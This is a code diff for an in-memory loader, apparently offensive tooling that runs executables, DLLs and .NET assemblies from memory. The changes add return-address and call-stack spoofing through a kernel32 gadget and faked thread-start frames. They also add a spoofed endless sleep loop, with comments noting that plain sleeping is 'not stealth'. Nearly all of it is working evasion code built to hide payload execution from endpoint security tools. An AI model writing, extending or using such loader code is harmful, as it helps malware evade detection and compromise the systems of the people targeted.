@@ -704,13 +704,16 @@ int Loader(INSTANCE* inst)
         return 0;
 
     //
-    // LoudSunRun
+    // LoudSunRun -> we need a gadget to perform the return to this function for DLL, for EXE we remove the gadget for cleaner call stack, because we don't come back this way
     //
     inst->api.RtlLookupFunctionEntry = (RtlLookupFunctionEntry_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sRtlLookupFunctionEntry);
     PVOID ReturnAddress = NULL;
     PRM p = { 0 };
     PRM ogp = { 0 };
     NTSTATUS status = STATUS_SUCCESS;
+
+    p.trampoline = FindGadget(moduleKernel32, 0x200000, inst->sGadget);
+
 
     ReturnAddress = (PBYTE)(inst->api.GetProcAddress(moduleKernel32, (char*)inst->sBaseThreadInitThunk)) + 0x14; // Would walk export table but am lazy
     p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, ReturnAddress);
@@ -719,6 +722,8 @@ int Loader(INSTANCE* inst)
     ReturnAddress = (PBYTE)(inst->api.GetProcAddress(inst->api.GetModuleHandleA(inst->sNtDLL), (char*)inst->sRtlUserThreadStart)) + 0x21;
     p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, ReturnAddress);
     p.RUTS_retaddr = ReturnAddress;
+
+    p.Gadget_ss = CalculateFunctionStackSizeWrapper(inst, p.trampoline);
     
     //
     // DotNet
@@ -756,7 +761,27 @@ int Loader(INSTANCE* inst)
         // _loaderDotNetFunction(dotnetModule, inst->dotnetModuleSize, inst->sCmdLine);
 
         // TODO handle the exit of the managed code in DotnetExe.cpp
-        Spoof(dotnetModule, inst->dotnetModuleSize, inst->sCmdLine, NULL, &p, func, (PVOID)0);
+        SpoofWithReturn(dotnetModule, inst->dotnetModuleSize, inst->sCmdLine, NULL, &p, func, (PVOID)0);
+
+        BYTE mode = inst->exitMode;
+        if (mode != 2 && mode != 3)
+            mode = 1;
+    
+        #ifdef DEBUG_OUTPUT
+            printf("DotNet return - mode %u\n", mode);
+        #endif
+    
+        if (mode == 3) {
+            for (;;) {
+                SpoofWithReturn(1000, NULL, NULL, NULL, &p, inst->api.Sleep, (PVOID)0);
+            }
+        }
+    
+        if (mode == 2) {
+            MM_ExitProcess(inst, 0);
+        } else {
+            MM_ExitThread(inst, 0);
+        }
 
         return 0;
     }
@@ -816,9 +841,12 @@ int Loader(INSTANCE* inst)
             InstallExitVEH(inst);
 
             // __debugbreak();
-            Spoof(NULL, NULL, NULL, NULL, &p, module->exeEntry, (PVOID)0);
+            SpoofNoReturn(NULL, NULL, NULL, NULL, &p, module->exeEntry, (PVOID)0);
 
             // we never come back here
+#ifdef DEBUG_OUTPUT
+            printf("Never printed!\n");
+#endif
 
             return 0;
         }
@@ -853,12 +881,28 @@ int Loader(INSTANCE* inst)
 
             // __debugbreak();
 
-            InstallExitVEH(inst);
+            SpoofWithReturn(NULL, NULL, NULL, NULL, &p, func, (PVOID)0);
 
-            // SpoofDllReturn in test.asm routes the export's return into AfterDllContinuation.
-            Spoof(NULL, NULL, NULL, NULL, &p, func, (PVOID)0);
+            BYTE mode = inst->exitMode;
+            if (mode != 2 && mode != 3)
+                mode = 1;
+        
+            #ifdef DEBUG_OUTPUT
+                printf("DLL return - mode %u\n", mode);
+            #endif
+        
+            if (mode == 3) {
+                for (;;) {
+                    SpoofWithReturn(1000, NULL, NULL, NULL, &p, inst->api.Sleep, (PVOID)0);
+                }
+            }
+        
+            if (mode == 2) {
+                MM_ExitProcess(inst, 0);
+            } else {
+                MM_ExitThread(inst, 0);
+            }
 
-            // we never come back here
             
             return 0;
         }
@@ -1693,13 +1737,37 @@ static DWORD HandleExitBehavior(void)
         mode = 1;
 
 #ifdef DEBUG_OUTPUT
-    printf("mode %u\n", mode);
+    printf("EXE exite handler - mode %u\n", mode);
 #endif
 
-    // TODO sleep is not stealth , find a way, maybe call spoof again ?
     if (mode == 3) {
+
+        //
+        // LoudSunRun -> we need a gadget to perform the return to this function 
+        //
+
+        HMODULE moduleKernel32 = hlpGetModuleHandle((wchar_t*)inst->wsKernel32DLL);
+        inst->api.RtlLookupFunctionEntry = (RtlLookupFunctionEntry_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sRtlLookupFunctionEntry);
+        PVOID ReturnAddress = NULL;
+        PRM p = { 0 };
+        PRM ogp = { 0 };
+        NTSTATUS status = STATUS_SUCCESS;
+
+        p.trampoline = FindGadget(moduleKernel32, 0x200000, inst->sGadget);
+
+
+        ReturnAddress = (PBYTE)(inst->api.GetProcAddress(moduleKernel32, (char*)inst->sBaseThreadInitThunk)) + 0x14; // Would walk export table but am lazy
+        p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, ReturnAddress);
+        p.BTIT_retaddr = ReturnAddress;
+
+        ReturnAddress = (PBYTE)(inst->api.GetProcAddress(inst->api.GetModuleHandleA(inst->sNtDLL), (char*)inst->sRtlUserThreadStart)) + 0x21;
+        p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, ReturnAddress);
+        p.RUTS_retaddr = ReturnAddress;
+
+        p.Gadget_ss = CalculateFunctionStackSizeWrapper(inst, p.trampoline);
+
         for (;;) {
-            MM_Sleep(inst, 1000);
+            SpoofWithReturn(1000, NULL, NULL, NULL, &p, inst->api.Sleep, (PVOID)0);
         }
     }
 
@@ -1716,29 +1784,6 @@ static DWORD WINAPI AfterExeContinuation(LPVOID parameter)
 {
     (void)parameter;
     return HandleExitBehavior();
-}
-
-DWORD WINAPI AfterDllContinuation(void)
-{
-    return HandleExitBehavior();
-}
-
-static inline int MemoryCallEntryPoint(HMEMORYMODULE mod)
-{
-    PMEMORYMODULE module = (PMEMORYMODULE)mod;
-
-    if (module == NULL || module->isDLL || module->exeEntry == NULL || !module->isRelocated || !module->inst)
-    {
-        return -1;
-    }
-
-    if (!InstallExitVEH(module->inst))
-        return -2;
-
-    module->exeEntry();
-
-    HandleExitBehavior();
-    return 0;
 }
 
 
